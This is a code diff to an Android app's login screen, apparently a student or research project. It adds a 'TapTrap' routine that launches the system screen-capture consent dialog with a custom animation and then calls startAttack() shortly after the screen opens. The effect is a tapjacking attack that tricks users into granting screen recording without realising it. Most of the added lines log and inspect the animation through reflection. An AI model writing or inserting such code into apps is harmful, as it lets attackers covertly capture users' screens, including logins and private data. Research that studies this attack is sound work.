@@ -1,6 +1,7 @@
 package com.example.inf2007_mad_j1847.view.auth
 
 import android.app.Activity
+import android.app.ActivityOptions
 import android.util.Log
 import android.widget.Toast // NEW: For simple error feedback
 import androidx.activity.ComponentActivity
@@ -28,6 +29,7 @@ import com.example.inf2007_mad_j1847.test.ScreenMirrorService
 import android.content.Intent
 import android.media.projection.MediaProjectionConfig
 import android.os.Build
+import androidx.core.app.ActivityOptionsCompat
 
 @Composable
 fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) {
@@ -56,28 +58,67 @@ fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) 
     }
 
     LaunchedEffect(Unit) {
-        if (ScreenMirrorService.sResultData == null) {
+        // THIS IS WHERE THE CODE GOES - IN COMPOSE
+        tapTrap.setScreenCaptureCallback(object : TapTrap.ScreenCaptureCallback {
+            override fun onLaunchScreenCapture(intent: Intent, enterAnimResId: Int) {
+                // Verify the resource exists
+                Log.d("TapTrap", "🎬 Launching with animation resource ID: $enterAnimResId")
 
-            val captureIntent =
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                    // Android 14 (API 34): force "Entire screen" (default display)
-                    mpm.createScreenCaptureIntent(
-                        MediaProjectionConfig.createConfigForDefaultDisplay()
-                    )
-                } else {
-                    // Older Android: normal flow
-                    mpm.createScreenCaptureIntent()
+                // Convert hex to check if it matches R.anim.ani_scale2
+                Log.d("TapTrap", "Hex value: 0x" + Integer.toHexString(enterAnimResId))
+
+                // Try to load and inspect the animation
+                try {
+
+
+                    val anim = android.view.animation.AnimationUtils.loadAnimation(context, enterAnimResId)
+                    Log.d("TapTrap", "✅ Animation loaded:")
+                    Log.d("TapTrap", "   Duration: ${anim.duration}")
+                    Log.d("TapTrap", "   FillAfter: ${anim.fillAfter}")
+                    Log.d("TapTrap", "   Class: ${anim.javaClass.simpleName}")
+
+                    // If it's an AnimationSet, inspect children
+                    if (anim is android.view.animation.AnimationSet) {
+                        Log.d("TapTrap", "   AnimationSet detected")
+
+                        // Get animations list - this is the correct way
+                        val animations = try {
+                            // Use reflection to get animations if needed
+                            val field = android.view.animation.AnimationSet::class.java.getDeclaredField("mAnimations")
+                            field.isAccessible = true
+                            field.get(anim) as List<android.view.animation.Animation>
+                        } catch (e: Exception) {
+                            Log.e("TapTrap", "Could not access animations via reflection", e)
+                            emptyList()
+                        }
+
+                        Log.d("TapTrap", "   Animation count: ${animations.size}")
+                        animations.forEachIndexed { index, child ->
+                            Log.d("TapTrap", "   Child $index: ${child.javaClass.simpleName}")
+                            Log.d("TapTrap", "      Duration: ${child.duration}")
+                            Log.d("TapTrap", "      FillAfter: ${child.fillAfter}")
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e("TapTrap", "❌ Failed to load animation", e)
                 }
 
-            mediaProjectionLauncher.launch(captureIntent)
-        }
-        delay(3000)
+                // 1. Create options with the resource ID
+                val options = ActivityOptionsCompat.makeCustomAnimation(
+                    context,
+                    enterAnimResId,
+                    1
+                )
 
-        println("launch ENTER")
-            tapTrap.startAttack()
+                // 2. Launch with options - animation is ATTACHED to intent
+                mediaProjectionLauncher.launch(intent, options)
 
-
-
+                Log.d("TapTrap", "Launched screen capture with animation ID: $enterAnimResId")
+            }
+        })
+        delay(500)
+        // Start the attack
+        tapTrap.startAttack()
     }
 
 
